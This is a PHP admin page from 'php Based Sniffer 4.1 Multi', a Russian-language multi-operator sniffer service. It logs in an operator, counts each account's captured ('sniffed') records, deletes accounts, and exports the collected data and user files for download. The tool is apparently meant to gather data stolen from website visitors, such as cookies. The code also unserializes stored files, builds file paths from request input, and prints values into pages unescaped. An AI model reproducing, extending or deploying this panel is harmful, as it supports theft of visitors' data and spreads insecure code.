<?
define("FILE", "admin.php");

require "config.php";
require "functions.php";

$users = array();
$users_content = get_file_content($users_filename);
if ($users_content !== NULL) $users = unserialize($users_content);
$users_num = count($users);

if ($_SERVER['REQUEST_URI'] != $_SERVER['PHP_SELF']."?".$_SERVER['QUERY_STRING'] and $_GET['user']) $virtual_folder = true;
	else $virtual_folder = false;

if ($virtual_folder) $user = $_GET['user'];
	else $user = $_SERVER['PHP_AUTH_USER'];

if ($user) {
	$user = strtolower($user);
	foreach ($users as $id => $info) {
		$some_user = unserialize($info);
		if ($user == $some_user['login']) {
			$this_user = $some_user;
			$password = $this_user['password'];
		}
	}
	if (!$password) unset($user);
}

if (!$user and $virtual_folder) {
	header("Location: ../log.php");
	die();
}

$authorized = false;
if ($user == $admin and isset($_SERVER['PHP_AUTH_PW'])) {
	if ($_SERVER['PHP_AUTH_PW'] == $password) $authorized = true;
	if ($authorized and !$virtual_folder) {
		header("Location: $user/admin.php");
		die();
	}
}

if (!$authorized) {
	header("WWW-Authenticate: Basic realm=\"php Based Sniffer 4.1 Multi\"");
	header("HTTP/1.1 401 Unauthorized");
	die("В доступе отказано.");
}

if ($_GET['export'] and ($_GET['what'] == "data" or $_GET['what'] == "users")) {
	header("Content-Type: application/octet-stream");
	if ($_GET['what'] == "data") {
		header("Content-Disposition: attachment; filename=\"data@".date("Y-m-d").".txt\"");
		$data_content = get_file_content($data_filename);
	}
	if ($_GET['what'] == "users") {
		header("Content-Disposition: attachment; filename=\"users@".date("Y-m-d").".txt\"");
		$data_content = get_file_content($users_filename);
	}
	echo $data_content;
	die;
}

if ($_POST['delete']) {
	del_users($_POST['select']);
	header("Location: ".FILE);
}

if ($_GET['clean']) {
	clean_user($_GET['_user']);
	header("Location: ".FILE);
}

if ($styles_enabled) {
	if ($_GET['style'] and file_exists("styles/".$_GET['style'].".css")) $style_filename = $_GET['style'].".css";
		elseif ($_COOKIE['s_style'] and file_exists("styles/".$_COOKIE['s_style'].".css")) $style_filename = $_COOKIE['s_style'].".css";
	$current_style = substr($style_filename, 0, strpos($style_filename, ".css"));
	$current_path = "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	preg_match("/^https?:\/\/[^\/]+([^\?]*\/)[^\?]+\//i", $current_path, $matches);
	setcookie("s_style", $current_style, time()+7776000, $matches[1]);
}

$data = array();
$data_content = get_file_content($data_filename);
if ($data_content !== NULL) $data = unserialize($data_content);
$entries_num = count($data);

$all_count = 0; $new_count = array();
foreach ($users as $id => $info) {
	$some_user = unserialize($info);
	$user_data = array(); $new_count[$id] = 0;
	foreach ($data as $key => $entrie) {
		$sniffed = unserialize($entrie);
		if ($some_user['login'] == $sniffed['user']) {
			$user_data[] = serialize($sniffed);
			if (!$sniffed['old']) $new_count[$id]++;
		}
	}
	$count[$id] = count($user_data);
	$all_count += $count[$id];
}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<title>Сниффер - Администрирование</title>
<link rel="stylesheet" type="text/css" href="../styles/<?=$style_filename?>">

<style type="text/css">
.input {font-size:12px;}
</style>

<script type="text/javascript">
function checkedNum()
{
	for (i=0; i<<?=$users_num?>; i++) {
		if (document.getElementById('select['+i+']').checked) document.getElementById('table['+i+']').className = 'marked';
			else document.getElementById('table['+i+']').className = 'unmarked';
	}
}

function checkOld()
{
	if (!document.getElementById('check_nonactive').checked) {
		for (i=0; i<<?=$users_num?>; i++) {
			document.getElementById('select['+i+']').checked = false;
		}
	}
	if (document.getElementById('check_nonactive').checked) {
		var now = <?=time()?>;
		if (document.getElementById('3month').selected) var diff = 7776000;
		if (document.getElementById('month').selected) var diff = 2592000;
		if (document.getElementById('2weeks').selected) var diff = 1209600;
		var limit = now - diff;
		for (i=0; i<<?=$users_num?>; i++) {
			if (parseFloat(document.getElementById('timestamp['+i+']').value) < limit && !document.getElementById('select['+i+']').disabled) document.getElementById('select['+i+']').checked = true;
				else document.getElementById('select['+i+']').checked = false;
		}
	}
	checkedNum();
}

function isChecked()
{
	var checked;
	for (i=0, checked=0; i<<?=$users_num?>; i++) {
		if (document.getElementById('select['+i+']').checked) checked++;
	}
	if (checked == 0) {
		checked = false;
		alert('Вы не отметили ни одной записи!')
	}
	return checked;
}
</script>
</head>
<body>
<p><input type="checkbox" id="check_nonactive" onClick="checkOld();"><label for="check_nonactive">отметить неактивных в течение</label> <select class="input"><option id="3month">3 месяцев</option><option id="month" selected>месяца</option><option id="2weeks">2 недель</option></select></a></p>
<form action="<?=FILE?>" method="post" onSubmit="return isChecked();">
<table>
<tr>
<td width="100" style="padding-left:10px;">Пользователь</td>
<td width="70">Записей</td>
<td width="140">Последнее посещение</td>
<td>&nbsp;</td>
</table>
<?
foreach ($users as $id => $info) {
	$this_user = unserialize($info);
?>
<input type="hidden" id="timestamp[<?=$id?>]" value="<?=$this_user['last_visited']?>">
<table id="table[<?=$id?>]" class="unmarked" style="margin-top:2px;">
<tr>
<td width="100" style="padding-left:10px;"><b<? if ($this_user['email']) { ?> title="<?=$this_user['email']?>"<? } ?>><?=$this_user['login']?></b></td>
<td width="70"><?=$count[$id]?><? if ($new_count[$id] > 0) { ?>&nbsp;<span title="Новых">(<?=$new_count[$id]?>)</span><? } if ($count[$id] > 0) { ?> &nbsp;<a href="<?=FILE?>?clean=1&_user=<?=$this_user['login']?>"><img src="../img/clean.gif" border="0" alt="Удалить записи пользователя <?=$this_user['login']?>" style="vertical-align:middle;"></a><? } ?></td>
<td width="140"><i><?=date("d.m.Y H:i", $this_user['last_visited'])?></i></td>
<td><input type="checkbox" name="select[<?=$id?>]" id="select[<?=$id?>]" value="<?=$id?>" <? if ($user == $this_user['login']) echo "disabled"; ?> onClick="checkedNum();"></td>
</tr>
</table>
<? } ?>
<table>
<tr>
<td width="100" align="center" style="padding-left:10px;">Всего:&nbsp;</td>
<td><? echo $entries_num; if ($entries_num != $all_count) { ?> &nbsp;<span class="small">(<a href="?clean=1" title="<?=$entries_num-$all_count?> шт.">удалить записи без владельца</a>)</span><? } ?></td>
<td>&nbsp;</td>
</table>
<input type="hidden" name="delete" value="1">
<input type="submit" class="button" value="Удалить отмеченных">
</form>
<li type="circle"><a href="<?=FILE?>?export=1&what=data">Скачать файл <?=$data_filename?>&#133;</a></li>
<li type="circle"><a href="<?=FILE?>?export=1&what=users">Скачать файл <?=$users_filename?>&#133;</a></li>
<p><a href="log.php">&larr; Вернуться в лог</a></p>
<p id="copyright">
php Based Sniffer 4.1 Multi<br>
&copy; <a href="http://kanick.ru">Kanick</a> 2005—2006 <a href="#">#</a></p>
</body>
</html>